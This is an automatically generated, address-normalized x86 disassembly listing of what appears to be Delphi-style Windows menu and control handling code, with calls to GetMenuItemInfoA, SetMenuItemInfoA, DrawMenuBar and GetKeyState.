mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4524ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45260e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042f8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042f8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404558
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452615
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045e0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043b8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042f8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404558
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4043b8
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45264c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_452aeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040d0
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_452aac
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_451a8c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4040d0
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452af2
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40405c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x18 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_452ca0
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_452468
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032e8
mov eax [ ebp - 0x20 ]
call sub_4032e8
mov eax [ ebp - 0x14 ]
call sub_4032e8
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_452468
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042f8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_454748
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407eb8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40408c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c484
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c484
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
push eax
mov edx esi
mov eax ebx
call sub_451a9c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404558
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407eb8
push ebp
mov eax [ ebp - 0x2c ]
call sub_452438
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_452438
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c484
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4040d0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_451a9c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4546b4
mov edx [ ebp - 0x40 ]
pop eax
call sub_40408c
mov edx esi
mov eax ebx
call sub_451a9c
push eax
mov edx esi
mov eax ebx
call sub_451a9c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404558
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4524ec
mov eax [ ebp - 0x18 ]
call sub_4042f8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404598
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4045e0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4524ec
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_452b48
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_451a8c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_451a8c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_452ccc
test al al
je r-xdata
mov eax esi
call sub_451a8c
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
call sub_452b24
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
call sub_452b24
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_451a9c
call sub_452b24
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_452c1d
add [ eax + ebx - 0x7b ] dh
in eax dx
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
call sub_452b24
test al al
je r-xdata
mov eax esi
call sub_451a8c
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
inc ebx
dec edi
jne r-xdata
je r-xdata
test ebp ebp
mov edx ebx
mov eax esi
call sub_451a9c
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
call sub_452b24
test al al
je r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_451a9c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_451a9c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
sub_452ca0
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_452ca0
and eax 0x7f
mov al [ eax + rw-data ]
sub_452ccc
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_452ccc
and eax 0x7f
mov al [ eax + rw-data ]
sub_452cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f9e0
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41d098
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_453a24
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_452d94
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4032e8
mov eax [ esi + 0x44 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_452e08
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_452e08
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44f54c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_451e90
mov eax ebx
pop esi
pop ebx
retn
sub_452e48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_451a8c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_451a9c
call sub_452e48
pop ecx
test al al
je r-xdata
sub_452ee0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_452e48
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44f54c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_452f10
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_452ee0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_454438
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_452f80
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_452ee0
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_452f9c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_452ee0
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45264c
mov ebx eax
xor edx edx
mov eax edi
call sub_452b48
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_451fb4
mov eax [ esi + 0x34 ]
call sub_451fb4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44fef0
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4464d0
push eax
call DrawMenuBar
sub_453088
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_453088
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4531ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_452ee0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_451fb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_453078
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_4531dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_427ce0
xor eax eax
push ebp
push sub_4532da
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_427ce0
xor eax eax
push ebp
push sub_4532af
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_453088
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_427cd8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4532e1
mov eax [ rw-data ]
call sub_427cd8
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_452ee0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_453300
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_453684
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_453684
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4533bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_453958
mov eax ebx
call sub_40883c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45345c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4533bc
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4042a8
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044f8
lea edx [ ebp - 0x200 ]
call sub_40892c
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4534f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_453560
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453a00
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_453a00
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_453a00
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45356c
push ebx
push esi
mov esi edx
mov ebx eax
